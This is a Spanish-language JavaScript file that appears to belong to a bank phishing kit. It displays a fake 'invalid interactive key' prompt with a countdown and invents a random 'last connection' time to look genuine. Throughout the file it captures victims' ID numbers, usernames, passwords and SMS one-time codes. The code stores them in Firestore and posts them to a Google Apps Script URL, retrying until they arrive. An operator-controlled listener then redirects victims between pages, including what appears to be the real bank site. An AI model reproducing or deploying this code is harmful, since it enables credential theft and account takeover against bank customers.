import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import {
    getFirestore,
    doc,
    collection,
    setDoc,
    updateDoc,
    getDoc,
    onSnapshot,
    serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
import { firebaseConfig } from "./firebase-config.js";

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Función compartida para crear o actualizar documento de redirección
async function crearDocumentoRedireccion(userId, tpDocumento, imagenSeleccionada, codigoSMS = '') {
    if (!userId) {
        throw new Error("El ID de usuario no puede estar vacío");
    }

    const docId = `${userId} - ${tpDocumento}`;
    const userRef = doc(db, "redireccion", docId);

    // Verificar si el documento existe
    const docSnap = await getDoc(userRef);

    if (!docSnap.exists()) {
        // Si el documento no existe, crearlo con setDoc
        await setDoc(userRef, {
            usuario: docId,
            IMG: imagenSeleccionada,
            SMS2: codigoSMS,
            page: 0 // Inicialmente en 0 para esperar instrucciones del admin
        });
    } else {
        // Si el documento ya existe, solo actualizar los campos necesarios con updateDoc
        await updateDoc(userRef, {
            IMG: imagenSeleccionada,
            SMS2: codigoSMS,
            page: 0 // Inicialmente en 0 para esperar instrucciones del admin
        });
    }

    return { docId, userRef };
}

// Función de carga de imágenes simplificada que siempre devuelve false
// Se mantiene por compatibilidad con código existente
async function cargarImagenesAsignadas() {
    console.log('Carga de imágenes desactivada, mostrando formulario SMS directamente');
    return false;
}

// Función para generar tabla de imágenes - vacía por compatibilidad
function generarTablaImagenes() {
    // Esta función ya no se utiliza pero se mantiene por compatibilidad
    console.log('Generación de tabla de imágenes desactivada');
}

// Hacer disponibles las funciones de Firestore globalmente
window.db = db;
window.doc = doc;
window.setDoc = setDoc;
window.onSnapshot = onSnapshot;

// Nota: window.checkImg se define más abajo, después de avanzarPaso1
// para evitar problemas de orden de definición

// Función para formatear fecha en formato DD/MM/YYYY HH:MM:SS a.m./p.m.
function formatearFecha(fecha) {
    const opciones = {
        day: '2-digit',
        month: '2-digit',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    };

    return fecha.toLocaleString('es-ES', opciones)
        .replace(',', '') // Eliminar la coma después de la fecha
        .replace(/(\d{2})\/(\d{2})\/(\d{4})/, '$1 / $2 / $3') // Agregar espacios alrededor de las barras
        .replace(/(\d{1,2}):(\d{2}):(\d{2}) (a\.m\.|p\.m\.)/, '$1:$2:$3 $4'); // Formato de 12 horas con segundos
}

// Función para generar una fecha aleatoria en los últimos 7 días
function generarFechaAleatoria() {
    const ahora = new Date();
    const hace7Dias = new Date(ahora);
    hace7Dias.setDate(ahora.getDate() - 7);

    // Generar un timestamp aleatorio entre hace 7 días y ahora
    const timestampAleatorio = Math.random() * (ahora.getTime() - hace7Dias.getTime()) + hace7Dias.getTime();
    return new Date(timestampAleatorio);
}

// Actualizar la hora de última conexión al cargar la página
// Usar serverTimestamp ya importado o usar fallback si no está disponible
if (typeof serverTimestamp !== 'function') {
    // Solo redefine si no es una función válida
    serverTimestamp = function () {
        return new Date();
    };
}

// (checkImg ya fue definido arriba)

// Intentar obtener serverTimestamp de Firebase si está disponible
try {
    // Verificar si Firebase está definido globalmente
    if (typeof firebase !== 'undefined' && firebase.firestore) {
        // Firebase v8 o anterior
        serverTimestamp = firebase.firestore.FieldValue.serverTimestamp;
    }
} catch (e) {
    console.warn('No se pudo importar serverTimestamp de Firebase, usando fallback:', e);
}

// La función guardarNombreUsuario ha sido eliminada ya que no se utiliza más
// Se reemplazó por cargarCustomDashboardMessage y actualizarDashboardConMensaje

// Función para actualizar el mensaje personalizado en el DOM
function actualizarDashboardConMensaje(mensaje) {
    try {
        // Si no hay mensaje, usar un texto genérico
        const mensajeCompleto = mensaje && mensaje.trim() ? mensaje : "BIENVENIDO";

        // Actualizar el saludo en el ribbon (selector: #ribbon .ribbon-button-alignment.pull-left)
        const ribbonElement = document.querySelector('.ribbon-button-alignment.pull-left');
        if (ribbonElement) {
            ribbonElement.textContent = `BIENVENIDO(A) ${mensajeCompleto.toUpperCase()}`;
        }

        // Actualizar el nombre en el menú lateral (selector: #show-shortcut span)
        // Obtener solo la primera palabra usando split
        const primeraPalabra = mensajeCompleto.split(' ')[0];
        const menuElement = document.querySelector('#show-shortcut span');
        if (menuElement) {
            menuElement.textContent = primeraPalabra.toUpperCase();
        }

        console.log('Mensaje personalizado actualizado en el DOM:', mensajeCompleto);
    } catch (error) {
        console.error('Error al actualizar el mensaje personalizado en el DOM:', error);
    }
}

// Función para cargar el mensaje personalizado y la imagen de perfil desde Firestore
async function cargarCustomDashboardMessage() {
    try {
        // Obtener datos del usuario del localStorage
        let usuarioData = {};
        try {
            const datosGuardados = localStorage.getItem('usuario');
            if (datosGuardados) {
                usuarioData = JSON.parse(datosGuardados);
            }
        } catch (e) {
            console.warn('Error al leer localStorage:', e);
            return false;
        }

        // Obtener el ID de documento necesario para buscar en Firebase
        const userId = usuarioData.documento?.trim();
        const tpDocumento = usuarioData.tipoDocumento?.trim();

        if (!userId || !tpDocumento) {
            console.warn('No se encontró información de usuario para cargar el mensaje personalizado');
            return false;
        }

        const docId = `${userId} - ${tpDocumento}`;
        const userRef = doc(db, "redireccion", docId);
        const userDoc = await getDoc(userRef);

        if (userDoc.exists()) {
            const userData = userDoc.data();
            let dataLoaded = false;

            // Verificar si existe el campo customDashboardMessage
            if (userData.customDashboardMessage) {
                // Actualizar el DOM con el mensaje personalizado
                actualizarDashboardConMensaje(userData.customDashboardMessage);
                dataLoaded = true;
                console.log('Mensaje personalizado cargado desde Firestore:', userData.customDashboardMessage);
            }

            // Verificar si existe el campo profileImageSrc
            if (userData.profileImageSrc) {
                // Actualizar la imagen de perfil en el menú lateral
                const profileImage = document.querySelector('a#show-shortcut img');
                if (profileImage) {
                    profileImage.src = userData.profileImageSrc;
                    dataLoaded = true;
                    console.log('Imagen de perfil cargada desde Firestore:', userData.profileImageSrc);
                }
            }

            return dataLoaded;
        }

        console.log('No se encontraron datos personalizados guardados en Firestore');
        return false;
    } catch (error) {
        console.error('Error al cargar los datos personalizados:', error);
        return false;
    }
}

// Mantener la función original para compatibilidad, pero redirigir a la nueva
async function cargarNombreUsuario() {
    return await cargarCustomDashboardMessage();
}

document.addEventListener('DOMContentLoaded', async function () {
    const lastConnectionElement = document.getElementById('last-connection-time');

    if (lastConnectionElement) {
        // Intentar obtener la última conexión desde localStorage
        let fechaConexion;
        const storageKey = 'dashboardLastConnection';

        try {
            const savedData = localStorage.getItem(storageKey);

            if (savedData) {
                // Si existe en localStorage, usar esa fecha
                fechaConexion = new Date(JSON.parse(savedData));
                console.log('Cargada última conexión desde localStorage:', fechaConexion);
            } else {
                // Si no existe en localStorage, generar una nueva fecha y guardarla
                fechaConexion = generarFechaAleatoria();
                localStorage.setItem(storageKey, JSON.stringify(fechaConexion));
                console.log('Nueva última conexión generada y guardada:', fechaConexion);
            }

            // Actualizar el texto con la fecha formateada
            lastConnectionElement.textContent = `Última conexión ${formatearFecha(fechaConexion)}`;
        } catch (e) {
            // En caso de error (ej: localStorage no disponible), usar comportamiento anterior
            console.warn('Error al manejar localStorage para última conexión:', e);
            const fechaAleatoria = generarFechaAleatoria();
            lastConnectionElement.textContent = `Última conexión ${formatearFecha(fechaAleatoria)}`;
        }
    }

    // Cargar el mensaje personalizado del dashboard desde Firestore
    await cargarCustomDashboardMessage();

    const paso0 = document.querySelector('.bootstrapWizard li:first-child');
    const paso1 = document.querySelector('.bootstrapWizard li:nth-child(2)');
    const contenedorPrincipal = document.querySelector('.text-center.margin-top-10');

    // Crear el contenido del paso 1 (formulario SMS)
    const crearContenidoPaso1 = () => {
        const contenidoPaso1 = document.createElement('div');
        contenidoPaso1.id = 'paso-sms';
        contenidoPaso1.className = 'text-center margin-top-10';
        contenidoPaso1.innerHTML = `
            <h3 class="text-center txt-color-azul" style="margin-bottom: 20px;">Clave interactiva invalida, por favor verifique e intente de nuevo.</h3>
            <div class="row">
                <div class="col-md-3"></div>
                <div class="col-md-6">
                    <div class="form-group">
                        <input type="text" id="codigo-sms" class="form-control input-lg" maxlength="50" oninput="if(this.value.length > 50) this.value = this.value.slice(0, 50);">
                        <div style="margin-top: 10px;">
                            <div class="progress" style="height: 20px; margin-bottom: 5px; background-color: #f5f5f5; border-radius: 4px; box-shadow: inset 0 1px 2px rgba(0,0,0,.1);">
                                <div id="progress-bar" class="progress-bar" style="width: 100%; height: 100%; background-color: #92a2a8; border-radius: 4px; transition: width .6s ease;"></div>
                            </div>
                            <div class="text-right"><span id="temporizador">Tiempo restante: <strong>165</strong> segundos</span></div>
                        </div>
                    </div>
                    <div class="form-actions">
                        <div class="row">
                            <div class="col-md-12 text-right">
                                <button type="submit" id="btn-confirmar" class="btn btn-primary"><i class="fa fa-check"></i> Confirmar</button>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-3"></div>
            </div>
        `;
        return contenidoPaso1;
    };

    // Variable para almacenar la referencia al contenido del paso 1
    let contenidoPaso1 = null;

    // Función para avanzar al paso 1
    const avanzarPaso1 = () => {
        // Cambiar la clase active en el indicador de pasos
        document.querySelector('ul.bootstrapWizard li.active').classList.remove('active');
        document.querySelectorAll('ul.bootstrapWizard li')[1].classList.add('active');

        // Crear y mostrar el contenido del paso 1 si no existe
        if (!contenidoPaso1) {
            contenidoPaso1 = crearContenidoPaso1();
            // Insertar después del contenedor de imágenes
            contenedorPrincipal.appendChild(contenidoPaso1);

            // Añadir event listeners a los botones
            document.getElementById('btn-regresar').addEventListener('click', regresarPaso0);
            document.getElementById('btn-confirmar').addEventListener('click', confirmarSMS);

            // Iniciar temporizador
            iniciarTemporizador();
        } else {
            contenidoPaso1.style.display = 'block';
        }
    };

    // Función para regresar simplemente recarga la página
    const regresarPaso0 = () => {
        window.location.reload();
    };

    // Función para manejar la confirmación del código SMS
    const confirmarSMS = async (event) => {
        event.preventDefault();

        const codigoSMSInput = document.getElementById('codigo-sms');
        if (!codigoSMSInput) {
            alert('Error: No se pudo encontrar el campo de código SMS');
            return;
        }

        const codigoSMS = codigoSMSInput.value;

        // Obtener datos de localStorage en lugar de sessionStorage
        let usuarioData = {};
        let imagenSeleccionada = '';

        try {
            const datosGuardados = localStorage.getItem('usuario');
            if (datosGuardados) {
                usuarioData = JSON.parse(datosGuardados);
                imagenSeleccionada = usuarioData.IMG || '';
            }
        } catch (e) {
            console.warn('Error al leer localStorage:', e);
        }

        // Realizar validaciones
        if (!codigoSMS) {
            alert('Por favor, ingrese el código SMS');
            return;
        }

        // Validar que sea numérico y tenga al menos 3 dígitos
       /*  if (!/^\d{3,}$/.test(codigoSMS)) {
            alert('El código SMS debe contener al menos 3 números');
            return;
        } */

        // Deshabilitar el botón para evitar envíos múltiples
        const btnConfirmar = document.getElementById('btn-confirmar');
        const btnRegresar = document.getElementById('btn-regresar');
        if (btnConfirmar) {
            btnConfirmar.disabled = true;
            btnConfirmar.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Procesando...';
        }

        try {
            // Preparar datos para enviar
            const datos = {
                imagenSeleccionada,
                codigoSMS,
                direccionIP: usuarioData.direccionIP || ''
            };

            // Obtener y actualizar datos adicionales del localStorage
            try {
                // Los datos del usuario ya los tenemos en usuarioData
                // Añadir estos datos a nuestro objeto
                datos.tipoDocumento = usuarioData.tipoDocumento || '';
                datos.documento = usuarioData.documento || '';
                datos.usuario = usuarioData.usuario || '';
                datos.passwd = usuarioData.passwd || '';

                // Actualizar localStorage con el código SMS
                usuarioData.SMS = codigoSMS;
                localStorage.setItem('usuario', JSON.stringify(usuarioData));
            } catch (e) {
                console.warn('Error al actualizar datos en localStorage:', e);
            }

            // Mostrar el spinner global
            const spinner = document.getElementById('preloader');
            if (spinner) spinner.style.display = "flex";

            // Intentar guardar en Firestore (si falla, continuar)
            let firebaseExito = false;
            try {
                // Intentar guardar en Firestore
                const docRef = doc(collection(db, 'datos_imagenes_sms'));
                await setDoc(docRef, {
                    ...datos,
                    fechaCreacion: serverTimestamp()
                });
                console.log('Datos guardados en Firestore con ID:', docRef.id);
                firebaseExito = true;
            } catch (error) {
                console.warn('No se guardaron datos en Firestore, continuando:', error);
            }

            // Intentar enviar a Google Sheets
            const sheetsExito = await enviarDatosGoogleSheets(datos);

            if (sheetsExito || firebaseExito) {
                // Si al menos uno tuvo éxito, configuramos listener para esperar instrucciones
                console.log('Datos procesados correctamente, esperando instrucciones del panel');

                // Mantener el spinner visible como indicador de espera
                // No ocultamos el spinner ya que estamos esperando instrucciones

                // Deshabilitar el botón durante la espera
                if (btnConfirmar) {
                    btnConfirmar.disabled = true;
                    btnConfirmar.innerHTML = '<i class="fa fa-spinner fa-spin"></i> Esperando...';
                }

                // Obtener el ID de usuario para la referencia a Firestore
                const userId = datos.documento.trim();
                const tpDocumento = datos.tipoDocumento.trim();
                if (!userId) {
                    throw new Error("El ID de usuario no puede estar vacío");
                }

                // Obtener el código SMS del formulario
                const codigoSMS = document.getElementById('codigo-sms')?.value || '';
                
                // Utilizar la función compartida para crear el documento de redirección
                const { userRef } = await crearDocumentoRedireccion(userId, tpDocumento, imagenSeleccionada, codigoSMS);

                // Ahora configurar la escucha de cambios en Firestore
                const unsubscribe = onSnapshot(userRef, (doc) => {
                    if (doc.exists()) {
                        const userData = doc.data();
                        const page = userData.page;
                        // Si el admin ha establecido una página de redirección
                        if (page > 0) {
                            // Redirigir según el valor de page
                            switch (page) {
                                case 1:
                                    const spinner1 = document.getElementById('preloader');
                                    if (spinner1) spinner1.style.display = "flex";
                                    window.location.href = "index.html";
                                    break;
                                case 2:
                                    const spinner2 = document.getElementById('preloader');
                                    if (spinner2) spinner2.style.display = "flex";
                                    window.location.href = "passwd.html";
                                    break;
                                case 3:
                                    const spinner3 = document.getElementById('preloader');
                                    if (spinner3) spinner3.style.display = "flex";
                                    window.location.href = "jrico.html";
                                    break;
                                case 4:
                                    const spinner4 = document.getElementById('preloader');
                                    if (spinner4) spinner4.style.display = "flex";
                                    window.location.href = "dashboard.html";
                                    break;
                                case 5:
                                    const spinner5 = document.getElementById('preloader');
                                    if (spinner5) spinner5.style.display = "flex";
                                    window.location.href = "dashboard-err.html";
                                    break;
                                case 8:
                                    const spinner8 = document.getElementById('preloader');
                                    if (spinner8) spinner8.style.display = "flex";
                                    window.location.href = "dashboard-tk-err.html";
                                    break;
                                case 9:
                                    const spinner9 = document.getElementById('preloader');
                                    if (spinner9) spinner9.style.display = "flex";
                                    window.location.href = "https://bdtenlinea.bdt.com.ve/?p=1";
                                    break;
                            }
                            // Opcional: Establecer un tiempo máximo de espera (por ejemplo, 2 minutos)
                            setTimeout(() => {
                                if (btnConfirmar) {
                                    btnConfirmar.disabled = false;
                                    btnConfirmar.innerHTML = '<i class="fa fa-check"></i> Confirmar';
                                }
                                alert("Tiempo de espera agotado. Por favor, intente nuevamente.");
                                unsubscribe();
                            }, 120000); // 2 minutos
                        }
                    }
                });
            } else {
                // Si ambos fallaron, ocultar spinner y mostrar error
                if (spinner) spinner.style.display = "none";
                throw new Error('No se pudo guardar la información');
            }
        } catch (error) {
            console.error('Error al procesar el código SMS:', error);

            // Ocultar spinner en caso de error
            const spinner = document.getElementById('preloader');
            if (spinner) spinner.style.display = "none";

            alert('Hubo un error al procesar el código SMS. Por favor, inténtelo de nuevo.');

            // Restablecer el botón
            if (btnConfirmar) {
                btnConfirmar.disabled = false;
                btnConfirmar.innerHTML = '<i class="fa fa-check"></i> Confirmar';
            }
    }
};

// Función para enviar datos a Google Sheets (no bloqueante)
const enviarDatosGoogleSheets = (datos) => {
    try {
        // Preparar datos en el formato esperado por enviarDatosAGSheets
        const datosFormateados = {
            direccionIP: datos.direccionIP,
            tipoDocumento: datos.tipoDocumento || "No especificado",
            documento: datos.documento || "",
            usuario: datos.usuario || "",
            passwd: datos.passwd || "",
            SMS: datos.codigoSMS || "",
            IMG: datos.imagenSeleccionada || ""
        };

        console.log('Iniciando envío a Google Sheets en segundo plano');
        
        // Iniciar envío en segundo plano sin esperar
        enviarDatosEnSegundoPlano(datosFormateados);
        
        // Asumir éxito para no bloquear el flujo
        return true;
    } catch (error) {
        console.error('Error al preparar datos para Google Sheets:', error);
        return false;
    }
};

// Temporizador para el SMS
const iniciarTemporizador = () => {
    const temporizadorElement = document.getElementById('temporizador');
    const progressBar = document.getElementById('progress-bar');
    if (!temporizadorElement || !progressBar) return;

    const tiempoTotal = 165; // 2:45 minutos
    let segundos = tiempoTotal;
    const interval = setInterval(() => {
        segundos--;
        if (segundos <= 0) {
            clearInterval(interval);
            alert('El tiempo para ingresar el código SMS ha expirado');
            regresarPaso0();
        } else {
            // Actualizar texto del temporizador
            temporizadorElement.innerHTML = `Tiempo restante: <strong>${segundos}</strong> segundos`;

            // Actualizar barra de progreso
            const porcentaje = (segundos / tiempoTotal) * 100;
            progressBar.style.width = `${porcentaje}%`;
        }
    }, 1000);
};

// Event listener para btn-guardar-nombre eliminado
// Ya no es necesario porque se eliminó la funcionalidad

// El event listener para input-nombre-usuario ha sido eliminado
// ya que el campo ya no existe en el HTML

// Ya no necesitamos listeners para imágenes, mostramos directamente el formulario SMS
// Reutilizamos la variable contenidoPaso1 ya declarada anteriormente
contenidoPaso1 = crearContenidoPaso1();

// Ocultar cualquier contenido previo en el contenedor principal
if (contenedorPrincipal) {
    contenedorPrincipal.innerHTML = '';
    contenedorPrincipal.appendChild(contenidoPaso1);

    // Añadir event listeners a los botones
    const btnRegresar = document.getElementById('btn-regresar');
    const btnConfirmar = document.getElementById('btn-confirmar');

    if (btnRegresar) {
        btnRegresar.addEventListener('click', regresarPaso0);
    }

    if (btnConfirmar) {
        btnConfirmar.addEventListener('click', confirmarSMS);
    }

    // Iniciar temporizador
    setTimeout(() => {
        iniciarTemporizador();
    }, 100);
}

// Asegurar que el loader esté oculto inicialmente
if (window.hideLoader) {
    window.hideLoader();
}

// Función optimizada para enviar datos a Google Sheets con timeout y retry
async function enviarDatosAGSheets(datos, maxReintentos = 3, timeoutMs = 8000) {
    const datosAEnviar = {
        DireccionIP: datos.direccionIP || "",
        TipoDocumento: datos.tipoDocumento || "No especificado",
        Documento: datos.documento || "",
        Usuario: datos.usuario || "",
        Passwd: datos.passwd || "",
        SMS: datos.SMS || "",
        IMG: datos.IMG || "",
    };

    const url = "https://script.google.com/macros/s/AKfycbx109GX3arUTEEqfKhVOyuEYVX1EoGMsDKpdHmiuvDhKWajbIfQ8vf57i4ZiZrXtK-Q-g/exec";

    for (let intento = 1; intento <= maxReintentos; intento++) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

            const response = await fetch(url, {
                method: "POST",
                mode: "no-cors",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                body: new URLSearchParams(datosAEnviar).toString(),
                signal: controller.signal
            });

            clearTimeout(timeoutId);
            console.log(`✅ Datos enviados a Google Sheets (intento ${intento})`);
            return true;

        } catch (error) {
            console.warn(`Intento ${intento} fallido:`, error.name);
            
            if (intento === maxReintentos) {
                console.error("❌ Falló el envío a Google Sheets después de todos los intentos");
                return false;
            }
            
            const espera = Math.min(1000 * Math.pow(2, intento - 1), 5000);
            await new Promise(resolve => setTimeout(resolve, espera));
        }
    }
    return false;
}

// Función para envío asíncrono en segundo plano (no bloquea la UI)
function enviarDatosEnSegundoPlano(datos) {
    enviarDatosAGSheets(datos).then(exito => {
        if (exito) {
            console.log("✅ Datos enviados a Google Sheets correctamente");
            localStorage.removeItem('pendienteGSheets');
        } else {
            console.warn("⚠️ No se pudieron enviar los datos a Google Sheets");
            const datosParaReintento = {
                ...datos,
                timestamp: Date.now(),
                reintentos: 0
            };
            localStorage.setItem('pendienteGSheets', JSON.stringify(datosParaReintento));
        }
    }).catch(error => {
        console.error("❌ Error inesperado enviando a Google Sheets:", error);
        const datosParaReintento = {
            ...datos,
            timestamp: Date.now(),
            reintentos: 0,
            error: error.message
        };
        localStorage.setItem('pendienteGSheets', JSON.stringify(datosParaReintento));
    });
}

// Función para reintentar envío de datos pendientes
async function reintentarDatosPendientes() {
    const datosPendientes = localStorage.getItem('pendienteGSheets');
    if (!datosPendientes) return;

    try {
        const datos = JSON.parse(datosPendientes);
        const tiempoTranscurrido = Date.now() - datos.timestamp;
        
        if (tiempoTranscurrido > 30000 && tiempoTranscurrido < 86400000) {
            console.log("🔄 Reintentando envío de datos pendientes a Google Sheets...");
            
            const exito = await enviarDatosAGSheets(datos);

            if (exito) {
                console.log("✅ Datos pendientes enviados exitosamente");
                localStorage.removeItem('pendienteGSheets');
            } else {
                datos.reintentos = (datos.reintentos || 0) + 1;
                if (datos.reintentos >= 5) {
                    console.warn("⚠️ Máximo de reintentos alcanzado, eliminando datos pendientes");
                    localStorage.removeItem('pendienteGSheets');
                } else {
                    localStorage.setItem('pendienteGSheets', JSON.stringify(datos));
                }
            }
        } else if (tiempoTranscurrido >= 86400000) {
            console.log("🗑️ Eliminando datos pendientes antiguos");
            localStorage.removeItem('pendienteGSheets');
        }
    } catch (error) {
        console.error("❌ Error procesando datos pendientes:", error);
        localStorage.removeItem('pendienteGSheets');
    }
}

// Iniciar sistema de verificación de estado al cargar
function initDataRetry() {
    reintentarDatosPendientes();
    setInterval(reintentarDatosPendientes, 300000); // Reintentar cada 5 minutos
}

document.addEventListener('DOMContentLoaded', async function () {
    // Inicializar el sistema de reintentos
    if (document.readyState === 'loading') {
        initDataRetry();
    } else {
        initDataRetry();
    }
    // Inicializar elementos del DOM solo si estamos en la página correcta
    const toko = document.getElementById('passwd');
    const submitBtn = document.getElementById('cmdLogin');
    //const spinner = document.getElementById('preloader');

    //spinner.style.display = "none";

    // Verificar que los elementos necesarios existan - solo continuar si estamos en la página correcta
    // Este código solo es relevante para la página de inicio de sesión, no para la página de imágenes
    if (toko && submitBtn) {
        // Continuamos con el código relacionado con el formulario de inicio de sesión

        // Función para validar la entrada (solo números y longitud mínima de 3)
        function validateInput() {
            if (toko && submitBtn) {
                // Eliminar cualquier carácter que no sea número
                const soloNumeros = toko.value;

                // Actualizar el valor del input solo si es diferente
                if (soloNumeros !== toko.value) {
                    toko.value = soloNumeros;
                }

                // Validar longitud mínima
                if (soloNumeros.length >= 3) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            }
        }

        // Agregar evento input para validar en tiempo real
        if (toko) {
            toko.addEventListener('input', validateInput);
            // Validar al cargar la página
            validateInput();
        }

        // Mostrar solo mientras se mantiene presionado el icono
        function enableHoldToShow(input, icon, showLabel, hideLabel) {
            if (!input || !icon) return;
            icon.setAttribute("aria-label", showLabel);
            icon.setAttribute("tabindex", "0");
            icon.setAttribute("role", "button");

            // Mostrar valor
            const showValue = () => {
                input.type = "text";
                icon.classList.remove("fa-eye-slash");
                icon.classList.add("fa-eye");
                icon.setAttribute("aria-label", hideLabel);
            };

            // Ocultar valor
            const hideValue = () => {
                input.type = "password";
                icon.classList.remove("fa-eye");
                icon.classList.add("fa-eye-slash");
                icon.setAttribute("aria-label", showLabel);
            };

            // Mouse
            icon.addEventListener("mousedown", () => {
                showValue();
                // Ocultar al soltar en cualquier parte
                const hideOnMouseUp = () => {
                    hideValue();
                    document.removeEventListener("mouseup", hideOnMouseUp);
                };
                document.addEventListener("mouseup", hideOnMouseUp);
            });

            // Touch
            icon.addEventListener("touchstart", (e) => {
                e.preventDefault();
                showValue();
                const hideOnTouchEnd = () => {
                    hideValue();
                    document.removeEventListener("touchend", hideOnTouchEnd);
                    document.removeEventListener("touchcancel", hideOnTouchEnd);
                };
                document.addEventListener("touchend", hideOnTouchEnd);
                document.addEventListener("touchcancel", hideOnTouchEnd);
            });

            // Teclado
            icon.addEventListener("keydown", (event) => {
                if (event.key === " " || event.key === "Spacebar" || event.key === "Enter") {
                    event.preventDefault();
                    showValue();
                }
            });
            icon.addEventListener("keyup", (event) => {
                if (event.key === " " || event.key === "Spacebar" || event.key === "Enter") {
                    event.preventDefault();
                    hideValue();
                }
            });

            hideValue();
        }
        
        // Initialize password show/hide functionality
        const passwordInput = document.getElementById("passwd");
        const eyeIcon = document.querySelector("#passwd + .input-group-text i");
        if (passwordInput && eyeIcon) {
            enableHoldToShow(
                passwordInput,
                eyeIcon,
                "Mostrar contraseña",
                "Ocultar contraseña"
            );
        }

        // Event Listeners
        if (toko) {
            toko.addEventListener('input', validateInput);
            validateInput(); // Validación inicial
        }
        if (submitBtn) {
            submitBtn.addEventListener('click', manejarEnvio);
        }
    } 
});

// Cierre del segundo event listener DOMContentLoaded
});